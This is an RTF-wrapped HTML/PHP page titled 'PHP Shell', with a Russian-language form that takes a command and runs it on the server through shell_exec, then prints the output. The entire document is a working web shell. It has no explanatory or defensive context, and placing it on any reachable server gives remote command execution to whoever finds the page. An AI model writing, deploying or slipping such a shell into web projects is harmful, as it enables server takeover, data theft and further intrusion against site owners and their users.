{\rtf1\ansi\ansicpg1252\cocoartf2818
\cocoatextscaling0\cocoaplatform0{\fonttbl\f0\fswiss\fcharset0 Helvetica;}
{\colortbl;\red255\green255\blue255;}
{\*\expandedcolortbl;;}
\paperw11900\paperh16840\margl1440\margr1440\vieww11520\viewh8400\viewkind0
\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0

\f0\fs24 \cf0 <!DOCTYPE html>\
<html lang="en">\
<head>\
    <meta charset="UTF-8">\
    <meta name="viewport" content="width=device-width, initial-scale=1.0">\
    <title>PHP Shell</title>\
</head>\
<body>\
    <h1>PHP Shell</h1>\
    <form method="post">\
        <input type="text" name="cmd" placeholder="\uc0\u1042 \u1074 \u1077 \u1076 \u1080 \u1090 \u1077  \u1082 \u1086 \u1084 \u1072 \u1085 \u1076 \u1091 ">\
        <input type="submit" value="\uc0\u1042 \u1099 \u1087 \u1086 \u1083 \u1085 \u1080 \u1090 \u1100 ">\
    </form>\
\
    <pre>\
<?php\
if (isset($_POST['cmd'])) \{\
    $cmd = escapeshellcmd($_POST['cmd']);\
    $output = shell_exec($cmd);\
    echo htmlspecialchars($output);\
\}\
?>\
    </pre>\
</body>\
</html>}